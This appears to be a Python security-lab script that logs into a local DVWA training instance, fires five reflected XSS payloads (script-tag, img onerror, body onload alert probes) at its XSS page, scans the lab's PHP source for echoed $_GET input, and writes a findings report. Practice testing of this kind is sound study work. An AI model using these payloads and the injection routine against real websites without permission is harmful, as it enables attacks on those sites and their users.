import requests
from bs4 import BeautifulSoup

# Configuration
DVWA_URL = 'http://localhost/dvwa/'
LOGIN_URL = 'http://localhost/dvwa/login.php'
XSS_URL = 'http://localhost/dvwa/vulnerabilities/xss_r/'
REPORT_FILE = '5xssoutput.txt'
DVWA_PATH = r'C:\xampp\htdocs\dvwa\vulnerabilities\xss_r\source\low.php'  # Update this to your actual DVWA installation path

# DVWA Credentials
USERNAME = 'admin'
PASSWORD = 'admin'

# Replace with your actual session ID
SESSION_ID = '8j076meeafjfigef0e8e91onnn'  # Ensure this is a valid session ID

# Function to perform XSS attack and retrieve data
def perform_xss_attack(session, payload):
    headers = {'Cookie': f'PHPSESSID={SESSION_ID}; security=low'}
    target_url = f'{XSS_URL}?name={payload}&Submit=Submit'
    response = session.get(target_url, headers=headers)
    response_status = response.status_code
    response_text_snippet = response.text[:500]  # Capture the first 500 characters of the response text
    vulnerability_detected = payload in response.text
    return target_url, response_status, response_text_snippet, vulnerability_detected

# Function to login to DVWA and retrieve CSRF token
def login_to_dvwa():
    session = requests.Session()
    session.cookies.set('PHPSESSID', SESSION_ID)

    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.content, 'html.parser')

    # Extract CSRF token
    csrf_token_input = soup.find('input', {'name': 'user_token'})
    csrf_token = csrf_token_input['value'] if csrf_token_input else None

    if not csrf_token:
        print('CSRF token not found in the login page HTML')
        return None

    # Login data
    login_data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login',
        'user_token': csrf_token
    }

    response = session.post(LOGIN_URL, data=login_data)

    if 'Login failed' in response.text:
        print('Login failed')
        return None

    return session

# Function to dynamically identify vulnerable code based on user input handling
def analyze_vulnerable_code(file_path):
    vulnerable_code_info = []
    with open(file_path, 'r') as file:
        lines = file.readlines()
        for i, line in enumerate(lines, start=1):
            if "echo" in line and "$_GET" in line:
                vulnerable_code_info.append((i, line.strip()))
    return vulnerable_code_info

# Function to write the test report
def write_report(results, vulnerable_code_info):
    with open(REPORT_FILE, 'w') as report_file:
        report_file.write('DVWA Reflected XSS Vulnerability Report\n')
        report_file.write('='*40 + '\n')

        for payload, (target_url, status_code, response_text, vulnerability_detected) in results.items():
            report_file.write(f'Test Payload: {payload}\n')
            report_file.write(f'Target URL: {target_url}\n')
            report_file.write(f'Response Status Code: {status_code}\n')
            report_file.write(f'Response Text Snippet:\n{response_text}\n')

            if vulnerability_detected:
                report_file.write('Vulnerability Detected:\n')
                report_file.write('The reflected XSS vulnerability is present because the application directly includes user input in the response without proper sanitization.\n')
            else:
                report_file.write('No vulnerability detected.\n')

            report_file.write('='*40 + '\n\n')

        # Append the vulnerable PHP code with line numbers
        report_file.write('Vulnerable PHP Code in PHP File:\n')
        report_file.write('='*40 + '\n')

        for line_number, code_line in vulnerable_code_info:
            report_file.write(f'Line {line_number}: {code_line}\n')
            report_file.write('Reason: Reflected XSS vulnerability. The user input is directly included in the response without proper encoding or sanitization.\n')

        report_file.write('='*40 + '\n')

# Main function to run the XSS tests
def run_xss_tests():
    session = login_to_dvwa()

    if not session:
        return

    results = {}

    # XSS payloads for low security level
    payloads = [
        "<script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "\"/><script>alert('')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
       
    ]

    for payload in payloads:
        print(f'Testing payload: {payload}')
        target_url, status_code, response_text, vulnerability_detected = perform_xss_attack(session, payload)
        results[payload] = (target_url, status_code, response_text, vulnerability_detected)
        if vulnerability_detected:
            print(f'Vulnerability detected with payload: {payload}')
        else:
            print(f'No vulnerability detected with payload: {payload}')

    session.close()

    # Analyze the vulnerable code in the PHP file
    vulnerable_code_info = analyze_vulnerable_code(DVWA_PATH)

    write_report(results, vulnerable_code_info)
    print(f'Report generated: {REPORT_FILE}')

# Entry point of the script
if __name__ == '__main__':
    run_xss_tests()